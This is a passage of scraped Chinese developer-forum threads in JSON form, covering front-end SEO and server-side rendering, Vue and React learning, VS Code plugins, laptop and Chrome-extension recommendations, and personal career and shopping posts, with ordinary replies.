{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>由于国内的搜索引擎对 js 的支持糟糕，那么是否可以这样，客户端请求的时候，将渲染之后的结果发送回服务端，保存为静态文件（根据比对内容决定是否更新），那么当下一次请求该页面的时候，直接返回已保存的静态文件即可。<br>\n（ PS ：我知道可以在服务端跑一些渲染程序，只是哪一个解决方案更好罢了）</p>\n</div></div>"], "reply": "21", "tittle": "单页应用的 SEO 解决方案，这么做是否可行？", "comment": ["SSR", "1. 使用 react 等技术直接输出 HTML ，这无疑是最好的，即便有一定的服务器资源开销也非常小，因此可以不考虑缓存、静态化等事情，也就无需去做复杂的缓存过期策略等工作。代价是会被某些框架捆绑\r", "2. 用 seojs 等做基于实际渲染的 HTML 输出，开销非常之高，如果可以正确识别出爬虫的话，考虑到爬虫的频率不高，可以不做缓存，事实上就爬虫这个频率，你缓存也没用基本等下次来爬也过期了\r", "3. 你自己说的方法，前提是爬虫来之前有用户访问，但通常爬虫的速度比普通用户还要快", "不信任任何客户端发来的东西，更何况 html", " 好不容易想到一个方案，突然又被你否决了，感谢", "国内的搜索引擎对 js 的支持糟糕？", "HTTP 304", "分享自己写的一个 SPA （单页面应用）的小站点，支持 SEO ，供你参考。\r", "前端基于 React （全家桶），然后上了 React 服务器端渲染。\r", " 我指的是搜索引擎的爬虫，还是你指的是别的问题", " 好的，感谢。。。 PS ：我用的 vue 全家桶，[artizen.cc]( ", ")", "prerender.io 开源的", " 移动端支持貌似不太好", " \r", "那么可以直接上 vue 服务端渲染哈\r", "有一些在线平台可以做，比如 ", " \r", " \r", "刚刚试了一下，添加完链接后，渲染结果页面是空白的，只有标题部分渲染成功了", " 你是怎么试的？用的在线版还是自己部署的？", " 在线版，有一个添加链接的表单，我加上去之后查看渲染结果是空白的", "看携程", " 哈哈，一直没时间去适配", " laravel log 有没有报错？", " 可能跟你那图片 src 有问题有关系\r", "```\r", "0|prerender | [Vue warn]: Error when rendering component <lazy-image>: \r", "0|prerender |   ", " in Lr\r", "```", " 对，刚刚我在查原因也看到了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>由于 iOS 系统没有原生的  TreeView 控件, 找到的其它实现自己看着很不爽, 于是我自己实现了一个, 并且额外加了选中功能 CheckBox 按钮. 如果您觉得这个控件对您有用, 请多多点赞, 提 issues, 提 PR. 谢谢.</p>\n<p>源码地址是:  <a href=\"https://github.com/OneSecure/UITreeView\" rel=\"nofollow\">https://github.com/OneSecure/UITreeView</a></p>\n<p>看起来像下图:</p>\n<img src=\"https://raw.githubusercontent.com/OneSecure/UITreeView/master/sample.png\">\n</div></div>"], "reply": "6", "tittle": "写了一个 iOS 下的 TreeView 控件, UITreeView", "comment": ["目测自己写的控件不建议以 UI 开头。", "- 不是以 framwork 的形式发布\r", "- 命名不规范，各种不带前缀\r", "- 无法定制外观\r", "- 严重依赖内建的数据结构，复用性差\r", "// 果然是基于 TableView\r", "// 佩服 lz 勇气", " 不知道你怎么不能复用了？ NodeData 类里有个复用的例子。这么简单的代码共享，你有什么好佩服的？\r", "所有的那些你嘲讽的缺点，相信你能很快搞定。提个 PR 成吗？", "看到 UI 开头就不想点链接了。。。", " 佩服你能够把任何意见解读成找茬\r", "\r", "我随便说一个， NodeData 应该是一个 protocol ，而不是 class\r", "// 而且我不认为这是一个有意义的项目", " 项目有没有意义，要看它对自己和他人有没有帮助，而不是你个傻逼的胡喷。你个傻逼只配得到一顶“眼高手低一无是处的废物”的桂冠。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近想把手头一些旧的命令行工具搬上线，让 pad 等随身设备能使用。</p>\n<p>几年前试着弄过一些单页界面，都是后端模板+jquery+ajax 拼出来的简陋东东。</p>\n<p>趁过年想入坑新的前端工具，都说 vue 中文资料全，求推荐 vue2 的中文资料。</p>\n<p><strong>官方文档、视频、文章……</strong></p>\n<p>作者有没有发过中文视频？油管上看了一些他做的英文报告。但是，你们不是说 vue 的中文资料比 react 多吗？</p>\n</div></div>"], "reply": "31", "tittle": "各位 vue 吹老司机请进来帮帮忙，新人求带上路", "comment": ["官网文档就行了，不需要什么视频教程。。", "顺求最佳实践. 现在还能搜出很多 vue1 的文章, 略坑.\r", "\r", "正在看官方文档.\r", "\r", "webpack+vue 的手工配置, 好像并没有仔细写出来.", "作者写了好多 demo 在 gh ，从 hellowrd 到 ssr 基本都有了还不够看？", " 多谢! 听说中文资料比较丰富, 想找些文档以外的中文资料看看.", "知乎这个问题的回答（ ", " ）下面有很多不错的例子，另外的话，如果非要找文档以外的中文资料看，也有很多博文可以看，我写的不好，就不贴了，祝进步", "我都录过视频...laravist.com 我的小站", " 大神，话说使用 vue 这些前端框架了，前后端分离了，后端只负责提供 api 。如果是用 php 写后端那还有使用 laravel 的必要性吗？是不是用更轻的框架或者不用框架更好一些？或者选择 golang ？一般是怎么做取舍？就像需要快速上线的就还是用 php 写。有性能问题了，再想其他的方案？", "官网就有中文啊。。。所有插件什么的都有中文 ", " 个人觉得看你业务和团队吧。一直说 php 性能问题的，也不去看看微博照样还是 php 。。。你 go 玩得溜就用 go 呗。", " 说 php 性能问题都是伪科学，有国外对比同是优化过的 php 和 nodejs ， PHP 要更快", "官方文档就是最好的", " php 的话微博已经升级了 php7 性能升级了相当多，不管是平时资源使用还是高峰期， ", " 来源？", "官方文档还不够吗。。。", " 这头像太气人了", "\r", "\r", " ", "Github 搜一个 awesome vue", "看看官方文档，找个项目教程对着撸， vuex 、 router-vue 、 vue-resource 之类的都上上手", "建议你学 angular  中文网站 angular.cn", " 性能是其中一个原因吧。我试过写相同的 api 用 lumen 和 golang 做对比， golang 快很多倍。但是加上网络传输的消耗， lumen 的性能还能接受。您说新浪用 php ，他们是用的很重的框架吗？还是鸟哥的 yaf ？但是现在的前提是前后端分离， php 不用再拼页面了，感觉优势不明显了。。。（一直认为 php 的优势是花式拼页面比较快 - -）", " 所以你用 go 呗…还想这么多干嘛", "刚好也在学 mark 一下", " 老大有学过哪些项目教程吗？多谢", "php 的话选择 laravel 5.3 , 你连 webpack 都不需要掌握了.", "慕课网你不看吗？有 3 门 vue ，讲的都可以", "官方文档+源码...够了", " php 的优势是开发效率，秒 go 十条街，部署成本低，性能不够可以堆机器", " 然而，有些时延性要求比较高的时候呢？", "\r", "\r", "会不断补充完善。", " \r", " \r", "非常感谢!!!"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>从去年六月份给 VS Code 写了第一个插件开始，没想到半年多时间已经写了<a href=\"https://marketplace.visualstudio.com/search?term=publisher%3A%22Jun%20Han%22&amp;target=VSCode&amp;sortBy=Downloads\" rel=\"nofollow\">8 个插件</a>了。</p>\n<p><img alt=\"image\" src=\"https://cloud.githubusercontent.com/assets/1050213/22546083/6e8d8e6e-e976-11e6-94f5-85138ce74c86.png\"></p>\n<p>最近想要歇歇了，可能近段时间不会再写新的了吧。😴  新年伊始会先专注于 IoT 开发： <a href=\"https://github.com/formulahendry/awesome-azure-iot\" rel=\"nofollow\">https://github.com/formulahendry/awesome-azure-iot</a> 😁  然而我这 8 个插件还有很多 feature 和 bug 在那里堆着。。如果有童鞋有兴趣想来 contribute ，非常欢迎！</p>\n</div></div>"], "reply": "42", "tittle": "近半年给 VS Code 撸了 8 个插件😅", "comment": ["赞一个", "你的项目很重要啊, 请不要断更", "厉害", "vscode 路还长着呢", "😂😂😂楼主你可以的", "谢谢分享，已 fo 楼主，看上去是微软上海的？离我们学校很近哎\r", "\r", "你好啊，目前我也在为 VS Code 写一个插件，是一个支持多语言的 Linter ，是用 ", " 实现的。项目地址是 ", " 。\r", "\r", "在实现的过程中遇到了一个问题，不知道楼主碰到过没有，这里问问看\r", "\r", "就是在分发的时候，因为是有一个 Language server 的 server 部分，是用 python 来实现的，但是正常 VS Code 的插件都是 js ，想知道有什么标准的分发套路么\r", "\r", "比如一个插件依赖一个二进制，怎么保证这个二进制是跨平台的并且是打包进插件一起分发的，\r", "\r", "现在很多的实现都是让用户自己安装然后在配置里写好路径，感觉这样很蠢。因为在我的例子中涉及的二进制是一个 server ，对于用户来说只有这个插件用的到，如果可以附加在插件中直接可以使用是坠吼的\r", "\r", "谢谢了 =。=", "向大佬低头", "好牛逼啊，跟这位校友相比我简直是渣渣", "。。。原来是微软员工，午饭给你加鸡腿了吗", " 的确是紫竹微软，而且碰到校友了，楼主也是软院滴～ 如果这个二进制是个 exe 之类可执行文件的话，可以把它一起打包进 extension ，然后用 asAbsolutePath API ( ", " linux 和 mac 的 bits ，一起打包就行， node 也有 API 判断是啥平台，哪个平台就用哪个 bits 。而你的是依赖 python 的 package ？这我就不太清楚了", "赞一个！", "向韩老师学习！😃", " 只是歇歇，暂时不写新的插件。原来的插件都会继续 maintain ，只是近期不会上新 feature 吧", " 😊😊", " 最多加个荷包蛋～ 这位同事才是要加双份鸡腿🍗 ", " ，而且他还是 PM 哦，微软的 PM 很多都是能撸代码的", "厉害了，北京同事向你学习。", "Cool ~  Auto Rename Tag 有在用~~", "其实我很想知道这个插件怎么做的，我也好想写", " 看了你的 github ，是要向你学习才是～！", " 官网上有很详细的教程 ", " ，然后再结合 sample ： ", " ，就可以自由翱翔了", "向上面各位大佬低头", "很喜欢你这几个扩展, 不过想吐槽一下为什么你的 auto complete tag 还要再依赖另一个, 这和我直接装两个区别何在 =_=", "Code Runner", " Auto Complete Tag 其实就是个 Extension Pack （插件的集合），类似于 Azure Extension Pack ： ", " ，它本身没有功能，就是插件的集合，方便你下载管理。参见 VS Code team 对 Extension Pack 的解释： ", "厉害", "vscode 有实现 0 延迟输入的计划吗？抱歉伸手，不过 webstorm 和 sublime 吸引我的很大一个原因是输入流畅…\r", "\r", "虽然基于 election 的 vscode 想实现 0 延迟有点难，可能需要 npapi 一类的插件实现？", "围观大佬", "膜拜， code runner 原来是你", "Code Runner 装了！很不错的扩展\r", "一直觉得会有用，结果根本没用到……", " 谢谢学长，去学习一个 =。=", " 我并不是 VS Code team 的唉。。 VS Code 本身相关的问题可以直接给他们开 issue ： ", "   不过话说，我并没有觉得 VS Code 和 Sublime 的输入流畅度有很大差别", " 看使用场景了吧，运行单个文件的话，还是经常会用到的", "一直在用你的 Code Runner ，非常感谢。", " 😁", "牛逼啊", "我也在用 code runner ，平时想试一些代码片段的效果比较方便，不用单独建一个文件去试。", "有什么用途，为什么接插件名称全部是英文的，有没有中文版的插件页面？\r", "有多少种语言可以写插件呢？我觉得给易语言写一个插件最好了，如果可以自动插入代码，嗯，自动编译等等，就像 vb61 样的插件机制，我觉得，在中国易语言会发生，更大的变化。", " 嗯，其实不是你的插件不好用，而是 vscode 我都是配好插件没咋用 orz\r", "vscode 目前的 vim 插件都不好用，而我已经离不开 vim 了", " vscode 的那几个 vim 插件我没用过～但我知道这个 ", " 应该还是不错的，插件作者一直在更新，也有 vs code 的 team member （正巧是我前同事😀）一直在做 contribution", "r#39 @", " 目前装的就是这个～不过可能因为是模拟，好多地方还是有点奇怪。比如 undo 功能", "安装了其中两个，谢谢楼主。", "感谢 LZ 哈， 有几个在用那， runner 临时调试个东西 很有用那。"]},
{"content": "", "reply": "29", "tittle": "求推荐一款预装 Linux 的笔记本", "comment": ["\r", "\r", "雷神（ THUNDEROBOT ） G150T 风刃版 15.6 英寸游戏本（ i7-6700HQ 8G 1TB GTX960M 2G 独显 FHD ）", " 有便宜点的么？", "dell ubuntu .ver", "dell xps", "我就见到神船预装 linux", "神舟的很多都预装 ubuntu", " #1 麻烦说明这是个 aff", "好像有人问过， dell xps developer edtion", "thinkpad 应该是没问题的……或者你去 Ubuntu 官网查，有推荐 list 的", "神船一般预装 linux", "很多笔记本只是预装 linux ，并不维护的", "先给楼主打个预防针。\r", "\r", "千万不要买 system76\r", "\r", "吹得很好。但是做工太差，质量不好，又贵", "Ubuntu 列表 ", "预装 Linux 就是不用给微软付钱了", "dell xps developer edition", "戴尔的工作站 Precision 5520 可以选配。\r", "\"Ubuntu Linux 16.04 [subtract $101.50]\"", "Chromebook ，多款可选", " 在哪可买。。", " ", ", 最畅销的学生本就是。再要么就 Google 官网，但是退换麻烦。\r", "其实我个人推荐还是买 x1 yoga 好，虽然没有预装，但是自己装一个也不费什么事。不用考虑兼容性的问题，肯定兼容！", "  x1 yoga 贵了吧，感觉买那个不如买 mac 的。", "其实还是建议买ｍａｃ", "dell ， thinkpad 对 linux 的支持都不错", "Dell 都有 Ubuntu 适配， ThinkPad 基本也都支持", "当你用过 win10/linux/bsd 的本本后，最终还是想买个ｍａｃ。", "system76", "想要高效率，买 Mac", "买不带独显的基本上都玩得转", "x1 carbon 2017 ，快上市吧， here is my money!", "既然想用 Linux 了，还是学着自己折腾吧，不想折腾还是用 windows 去吧"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>如果 ok ，之后还得 sketch 再做一套高保真并出 @2x 3x...</p>\n<h1>其实我想说的是，这大妞素材我也忘记是哪里看到存下的了，好稀罕！</h1>\n<p><img alt=\"cover1-1486044560-100.png\" src=\"https://ooo.0o0.ooo/2017/02/02/5893512a0464b.png\"></p>\n<h1>还有我这老air... 看来真要退役了</h1>\n<p><img alt=\"E649EFBC-BB45-4EA5-AC0D-028993FE6DBE.png\" src=\"https://ooo.0o0.ooo/2017/02/02/589352b5ecf56.png\"></p>\n<p><img alt=\"F5062D06-6CC5-4D71-AE48-AC34FA5F98B9.png\" src=\"https://ooo.0o0.ooo/2017/02/02/5893530a0e634.png\"></p>\n<h1>还有sei</h1>\n</div></div>"], "reply": "49", "tittle": "一晚上时间要赶制出一套完整的 APP 原型。。。好虐", "comment": ["C17KTH4XF5V7", " 哼", "😂这打码和没打有区别吗\r", "\r", "另外，打码意义何在…", "大大，劳驾问一下， 2015 的 air 如果用来做交互设计，能用多久，卡吗？", "帮你升级成 pro 这图床不错 收藏了\r", "\r", "帮你搜下了这位美女的图片\r", " 没啥意义，条件反射。。。 哈哈", " 单做交互没啥问题的。。。你看我这配置不也一样在战斗么。。。而且还各种 ssh 、 dash 。。。各种窗口", " cool :)", " thx", "不放链接吗", "叫你这个设计不学 storyboard", " 怎么不直接用 Sketch 做呢", "在用 12 款 air 回帖", "同 12 款 air 回帖", " 那样的话时间本成太高。。。一晚上根本搞不完。", " :)", " :)", " 学，学，我学还不行嘛", "一晚上要拿着这个原型做出 app 。....\r", "好虐", " 呃。。。是一晚上做出个 APP 原型。。。这是第一张", " Apple 的产品序列号非常重要，真心不要公开\r", "（至少以前可以通过序列号重置 AppleID 的相关信息，因为这些设备是你的 AppleID 常用设备）", " 感谢大大，如果 sketch 、 axure 、 ps 都时常要用的话，会有问题吗？我本人是程序员，想买台送做设计的女票😁", " 大大不敢当，不用客气。按你的描述 其实妹子跟我一样的，而且我还要写程序，所以说 真是各种同开。。。内存肯定买大不买小，正常情况下 V 友更多的都是 16G 内存，不过 8G 妹子也够用", " 嗯嗯。。。", " \r", "\r", "谢谢谢谢，如果有钱肯定是上 pro 最好，但现在我们都是马上出去工作的学生，还没什么钱\r", "\r", "自用的 pro 是家里出钱的，送给她还是用自己的钱用着舒服😁", "\r", "\r", "帮你找到大榕的微博了 不谢~\r", "\r", "另外 MAC 512G  16G I7 毫无压力", "🤷‍♂️已感谢\r", " thx", " 嗯，懂了！加油", "直接拿人家照片作产品，得先去买个授权吧...", "附上楼主使用图片的网址 \r", "\r", "点进去不会后悔的\r", "\r", "这楼歪的……噗……", " Air 的屏幕太烂了", " 没有，只是个 demo ，如果商用 肯定会", " \r", "资金不够的情况下，只能吸收可以牺牲的", " 应该把你的 pro 给女朋友, 自己用 air", "微博 ", " 女主的", " \r", "6666", "今天刚把自己的 2011 的 air 升级到 mac os sierra", " 老司机 6 的不行", "你用这个妹子万一火了 app 是不是要收你的版权啊", " 就是 demo 临时用一下。。。如果商用 肯定要授权，我们在各种获取授权花费及尊重他人方面从不吝啬。", " 长得有点像小花， 360 的", "这楼歪的可以", " 永恒的话题", "沒事\r", "2011 年的 Air 路過~\r", "\r", " 哇", " 我也是刚升没几天。。。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>凌晨 3 点了，做一个题，<code>从[1,m]区间截取长度为 n 的组合，返回这些组合的数组（顺序不敏感）。 例如：从[1,3]中获取所有长度为 2 的组合。 应该返回 [[1,2],[1,3],[2,3]]</code>实际上就是很早之前的排列组合问题。  这个题目折腾了将近三四个钟头才差不多理清楚，有点儿沮丧。</p>\n<p>因为年后要开始投简历找工作，最近一直在刷水题。 过年期间耽搁一下加上懒散 水站上题目做了百分二十都不到。 此外之前做移动端的，近来开始捣鼓简单的后端开发，感觉成效比刷水题练算法多的多了。</p>\n<p>但是就 <strong>纯粹找工作</strong> 而言， <strong>这段时间刷题再提一点算法，还是把后端开发的雏形搞清楚(并非要搞透彻，一俩月也没奢求这个效果，搭完接口能跑就成)，哪个在面试中加分更多一点呢 ?</strong>  本人不想一直做移动开发，想着将就着再做一段就转后端。个人太容易钻牛角尖里，一个题不会就不知不觉搞进去好几个钟头，所以得搞重点突破，希望 V 友们指点迷津，不甚感激。</p>\n</div></div>", "<div class=\"topic_content\">谢谢大家的建议！  我还是先集中搞业务层面的东西，基础类的还是等以后工作中再慢慢补好了。\r<br>祝大家新年行大运。</div>"], "reply": "13", "tittle": "深夜发帖，找工作的一点儿困惑？", "comment": ["說是編程，其實很多時候都是數學題。這個題找本組合數學書複習一下吧。", "有项目最好使。当然项目太挫也不行", "好久没去 leetcode 上摸鱼了😂  我觉得吧   其实有时候 看书 和 在 gayhub 上看别人的代码 也会有帮助的…(总觉得一味刷题好功利啊", "在刷题的同时，也带着写几个小项目，这样最好了", "先刷刷简单和中等难度吧", "我这么多年各种面试，基本没有问我算法的。大厂面试也没遇到过，供参考吧。", "就面试经验而谈，你简历上不说算法，别人也很少问，毕竟你又不是搞算法的？还有就是项目要牛逼，不要太多就成。", "纯粹找工作, 还是,把业务练熟吧...\r", "\r", "算法这种东西..是决定你上限的存在......如果社招进,BAT 这类的大公司,刷水题又没什么卵用....", "刷题好难", " 大厂是不是只在校招的时候问算法？反正当年去面鹅厂的同学回复说都面了算法。", " 可能吧，可能校招的时候项目这一块没啥好问的。", " gayhub 。 233333", "应用层开发确实应用技术比较重要，毕竟需要算法的东西一般都是现成的。\r", "但是我不建议把算法放下，否则成长容易遇到瓶颈。\r", "\r", "所以建议楼主\r", "\r", "目前主攻实用型技术，最好做个像样的东西。同时养成刷题的习惯，每周固定多长时间或者几道题。\r", "\r", "另外，我感觉楼主基础差了点，现在直接刷题效率会很低，有时间最好把专业基础课补补，没时间就买本《程序员的数学》这类书看看。"]},
{"content": ["<div class=\"topic_content\">大学毕业那年，实习间隙考了一张教师资格证，本身是陪 EX 考的，没想到居然真要用得上了。\r<br>过年没有回家，在这个世界级大城市依然是一无所有， 60 平房子没有爱人也仅仅是房子，不是家。\r<br>毕业八年多，不算实习干过三家公司，人家待我不薄，我也努力工作，房贷还清了，手里也没攒下什么钱。学了一些东西，但是不精。 EX 跟人走掉了，这个怨不得她，现在她可以经常出国旅游，孩子跟知名乐团首席学习乐器，跟 985 高校外语系教授学外语，跟着我，也就有个遮风挡雨的地方。\r<br>后来处的几个女友，更看重工资单，谈不到一起去。\r<br>二手车一辆，年前半卖半送给小弟了，跟着我三年，输出不少，提升有限。\r<br>在一个业内业外都有些名气的公司，说起来好听，整个行业正在日趋传统行业化，超额估值和超额工资都不会长久。\r<br>年龄大了，该有张稳定的饭票了。</div>"], "reply": "目前尚无回", "tittle": "想了很久，可能真要回家乡参加教师招考了", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><blockquote>\n<ul>\n<li>原文链接: <a href=\"https://blog.prototypr.io/align-svg-icons-to-text-and-say-goodbye-to-font-icons-d44b3d7b26b4#.9gcnlx2bm\" rel=\"nofollow\">Align SVG Icons to Text and Say Goodbye to Font Icons</a></li>\n<li>原文作者 : <a href=\"https://blog.prototypr.io/@Elliotdahl\" rel=\"nofollow\">Elliot Dahl</a></li>\n<li>译文出自 : <a href=\"https://github.com/xitu/gold-miner\" rel=\"nofollow\">掘金翻译计划</a></li>\n<li>译者 : <a href=\"https://github.com/aleen42\" rel=\"nofollow\">aleen42</a></li>\n<li>校对者 : <a href=\"https://github.com/zhouzihanntu\" rel=\"nofollow\">zhouzihanntu</a> <a href=\"https://github.com/hikerpig\" rel=\"nofollow\">hikerpig</a></li>\n</ul>\n</blockquote>\n<p><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1600/1*YJKqXVh1XZcKB9QeyVcKkA.png\"></p>\n<p>在字体图标盛行的时代，推行 SVG 图标可谓是 Web 社区中的一次重要契机。毕竟，使用 SVG 图标系统能更好地遵循图形的访问性标准，并渲染出更高质量的图像。此外，开发者还能轻而易举地通过该类系统增加 /删除 /修改库中的图标。因此，鉴于这样的优势，我们使用 React 开发了一套自家的 SVG 图标系统产品，并发布在 <a href=\"https://pivotal.io/\" rel=\"nofollow\">Pivotal</a> 上。本文将阐述作者如何使用 CSS 来对 SVG 图标系统进行样式的定制以高效便捷地使用该类系统。</p>\n<p>更多文章请阅读： <a href=\"https://github.com/aleen42/PersonalWiki/blob/master/translation/align_svg/align_svg.md\" rel=\"nofollow\">https://github.com/aleen42/PersonalWiki/blob/master/translation/align_svg/align_svg.md</a></p>\n</div></div>"], "reply": "3", "tittle": "[译] Align SVG Icons to Text and Say Goodbye to Font Icons - 把 SVG 图标对齐到文本，以告别字体图标（ Font Icons）的时代", "comment": ["学习下，看完写个读后感", " 學", "我们直接把 svg 图标用到 react native 上，效果还行，可以热更新"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"https://www.facebook.com/friendsday\" rel=\"nofollow\">https://www.facebook.com/friendsday</a><br>\n这个视频是服务器根据不同用户的好友情况渲染出来的吗？</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "facebook 好友节视频是如何制作的？", "comment": []},
{"content": ["<div class=\"topic_content\">上个星期收到一条短信，信用卡被刷了 300 多英镑，还以为是盗刷，结果昨天和客服核实，发现英亚帮我下单了一个 sony ps vr 只有头盔，折合人民币 3100 直邮含税，感觉现在 ps vr 游戏太少，而且还要单独再买 move 和 camera,好麻烦，而且最主要的问题是不一定有时间玩，放家里估计就是吃灰，现在已经在香港海关，也不好退了，好纠结.....</div>"], "reply": "31", "tittle": "被英亚自动下单了一个 PS vr, 正在犹豫要不要....", "comment": ["投诉", "没听说过自动下单 = =", "楼主你是不是没货的时候下的单  亚马逊是发货才扣款, 目测你是自己买的 后来忘了 = =", "来自乡村的我不懂为什么你不追究他自动下单这件事", " 有可能，还有救么?", "有钱人", "move 也没那么多用……我试玩了一些游戏，也就 job simulator 和一个很奇怪的堆垒积木的“智力”游戏用了\r", "摄像头我淘宝上搜了下才…… 10 块钱", "可以体验了试试，我感觉要求不是很高的话， PSVR 还算说得过去。", "可以转手啊", "你自己下的单和亚马逊帮你下这两码事好吗", "没有自动下单，是你预订了。既然是自己的选择，就用着呗。 move 不需要， camera 全新的也就 200 多", "自动下单   好先进的功能...", "哈哈，我是标题党了....@swulling  camera 这么便宜？我在 jd 上看都是 300 多的?", " 记错了， 300 多，前一段时间买了一个", "这世界上不负责任乱喷的人实在是太多了。。。", "LZ 是不是没有关闭 一键下单（ One-click checkout ）?\r", "之前用 app 浏览美亚不小心碰到 one-click ，然后一个订单就生成了……", " 恩，有可能，反正我从来没有感觉到我下过单....", "  果然，  You ’ ve disabled 1-Click ordering everywhere\r", "Note: 1-Click ordering is always enabled for digital video, Kindle books, MP3s and other digital purchases. \r", "\r", "我没设置过这伙呀，可以投诉吗？！！！", "是不是之前种草之后日思夜想造成晚上梦游的时候下的", "挂闲鱼卖了，，，搞不好还赚钱了", "试试生化危机 7 （", "国行京东发售那天拿到 PS VR 的来说说把\r", "\r", "如果你想拿来用“影院模式”当普通屏幕玩，就放弃把，模拟出来的分辨率太渣小点的文字都看不清楚。\r", "如果你想用来沉浸进去玩赛车类的，也放弃把，目前就是个驾驶俱乐部 VR ，画面扎的，说真的开的有点头晕。\r", "\r", "以上是我当时定 VR 的主要目标，都没实现，所以转手就卖了。\r", "\r", "同时说说 VR 带来很惊喜的感觉：\r", "《初音演唱会 VR 》这个有 demo ，一定要体验下初音在你面前触手可得的感觉。\r", "《 EVE 瓦尔基里》作为个曾经的 EVE 的玩家，当开着舰载机从航母上起飞到太空那一块，真的惊了，太爽了。就是也有点晕。\r", "《 Allumette 》《 Wayward Sky 》第一个是用上帝视角看个故事，第二个是上帝视角玩第三人称的游戏。这两个让我看到了 VR 另一个方向“上帝视角”，比起沉浸体验，感觉上帝视角更为舒服。想想一个飞艇你可以把眼靠在窗户上往里面看的感觉，虚拟的世界都在你眼前好像模型一样。\r", "《 PlayStation VRroom 》这个官方的小游戏合集，很适合家里一堆人一块玩，有猫抓老鼠了什么的，不会让你一个人带个头盔其他人只能看电视，很欢乐。\r", "\r", "以上，不差这点钱就把 VR 买来体验下吧，不喜欢再卖了也行。", "补充下 camera 是必须的， move 可以不用买，大部分都用不到。。", "投诉，说不定会免费送你。。。", "初音我感觉效果并不好，世嘉的建模太渣了\r", "之前看别人玩 htc vive 上的一个游戏，可以直接导入 tda 模型玩，那个效果好多了", " #2 亚马逊是有一键下单的功能。\r", "误下也是常有的事，但楼主关键在于，自动下单了却没去取消。", " 我没试过投诉，那次碰巧发现的早在扣款前把订单取消了，想想后怕。\r", "而且我记得亚马逊设置了 payment method 和 shipping address 后就会默认开启一键下单\r", "（说实话这功能有点坑，点一次就直接可以下单了，要是家里有熊孩子的话……）", "其实 P o r n H u b 等世界大站都开始支持 VR 了。觉得这可以当成你买的一个理由。", "先退货，然后等你有充足的需求买时你再买，不然买了后悔就不值当了。如果不差钱，那就无所谓了", "P o r n H u b ,我想起了最近的 inauguration, \"Rich White Man F**ks The Entire Country At Once\", haha", "PSVR 感觉没啥用..还不如我的 DK2 内容实在是太少了 不过有目前我觉得最强的 VR 游戏体验 Batman 还是值得一试的"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>现在的 Web app 基于 React ，首屏加载速度堪忧，正在努力优化中。</p>\n</div></div>"], "reply": "6", "tittle": "你们是如何改善首屏加载速度呢？", "comment": ["官方提出的解决方案就是服务端优化吧", "用 webpack 做了 code spliting 了吗？ 根据路由加载 bundle 块就可以提升很多速度了。 ", "看问题主要在哪了， js render 执行时间太长, 还是， bundle 和静态资源加载太久?", " @", " 两位提到的都在进行中。", "服务端渲染\r", "react router 按需加载\r", "webpack 优化，把 react ， redux 这种提取出来用 cdn", " 服务端渲染确实会有很大提高，但是目前暂不考虑。目前的优化重点确实是 webpack 部分。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>刚在线安装的 vs2017 已经安装 web 开发模块</p>\n<p>但新建一个项目 我发现只有个 mvc4 的，选择 net core 项目的话只有个 webapi</p>\n<p>这个要怎么搞？</p>\n<p>![w]( <a href=\"https://blog.coderstory.cn/wp-content/uploads/2017/02/QQ\" rel=\"nofollow\">https://blog.coderstory.cn/wp-content/uploads/2017/02/QQ</a> 截图 20170204221455.png)</p>\n</div></div>"], "reply": "3", "tittle": "visual studio 2017 RC 怎么创建 MVC6 的项目？", "comment": ["![w]( ", ")\r", "\r", "这空格是什么鬼", " Core MVC 没有专门的项目模板\r", "  但选择 .net fremewark 也只有个 mvc4"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><strong>君子生非异也，善假于物也。</strong></p>\n<p>那么一起来探讨下『那些你觉得堪称神兵利器的 Chrome 插件』。</p>\n<ul>\n<li><strong>Vimium</strong></li>\n<li><strong>OneTab</strong></li>\n<li><strong>Adblock Plus</strong></li>\n<li><strong>阅读模式</strong></li>\n<li><strong>LastPass</strong></li>\n<li><strong>Infinity 新标签页</strong></li>\n</ul>\n<p>... ...</p>\n<p><a href=\"http://www.jeffjade.com/2017/01/23/118-chrome_awesome_plug-in/?hacpai\" rel=\"nofollow\">Awesome Chrome 插件集锦</a></p>\n<p>等等都是<strong>居家必备</strong>的存在，你觉得呢？。</p>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p>个人常用的是这些；看了这么多朋友的分享，看来需要是时候考虑更新使用了。\n<img alt=\"Chrome 插件\" src=\"https://img.hacpai.com/file/2017/1/e31fd23e213e46ea8480e6b56c186a9f-201701232.00.52.png\"></p>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><ul>\n<li><strong>Octotree</strong></li>\n<li><strong>SwitchyOmega</strong></li>\n<li>Print Friendly &amp; PDF</li>\n<li><strong>网页截图:注释&amp;批注</strong></li>\n<li><strong>一键管理所有扩展</strong></li>\n</ul>\n<p>经过一番见识与品味，发现以上这些也是极好用的存在，详情请参见 <strong><a href=\"http://www.jeffjade.com/2017/01/23/118-chrome_awesome_plug-in/?v2ex\" rel=\"nofollow\">Awesome Chrome 插件集锦</a></strong> (☆_☆)；</p>\n</div></div>"], "reply": "212", "tittle": "那些你觉得堪称神兵利器的 Chrome 插件", "comment": [" 少年考虑重磅的拓展管理咩？根据网页自动管理拓展+拓展更新提醒+拓展历史记录+拓展详情+拓展社区推荐\r", "\r", " 少年我看到你拓展管理是：一键管理所有扩展\r", "\r", "不知道有没有兴趣看看我写得重磅拓展管理？自动拓展管理+批量拓展管理+拓展更新提醒+拓展详情+拓展推荐\r", "\r", "感觉这个强行推广貌似太过分了。。。就此打住，咔咔，看来闲着的时候就该写拓展了。。。", "Tampermonkey +1", " #22 同样换成了 uBlock", "顺带问一下有没有什么能够隐藏插件的插件？\r", "以前 Chrome 可以直接隐藏，图标不显示，后来改版后就不行了\r", "很多插件其实没啥大用处，比如支付宝那个，图标一直显示在那强迫症真的有点受不了", 